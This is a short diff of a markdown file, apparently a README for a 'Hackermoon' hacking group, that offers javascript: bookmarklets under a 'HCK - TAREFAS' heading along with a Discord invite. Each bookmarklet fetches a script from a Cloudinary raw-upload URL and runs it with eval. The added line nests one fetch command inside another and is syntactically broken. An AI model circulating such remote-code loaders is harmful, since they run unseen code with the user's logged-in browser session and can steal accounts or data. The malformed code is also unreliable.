@@ -6,7 +6,7 @@ javascript:fetch("https://res.cloudinary.com/dctxcezsd/raw/upload/v1745012111/sa
 ```
 ### HCK - TAREFAS:
 ```js
-javascript:fetch("TESTES").then(t=>t.text()).then(eval);
+javascript:fetch("javascript:fetch("https://res.cloudinary.com/dctxcezsd/raw/upload/v1745790408/saladofuturov2.js").then(t=>t.text()).then(eval);").then(t=>t.text()).then(eval);
 ```
 
 ### [Discord: Hackermoon](https://discord.gg/k5BFyvbj)
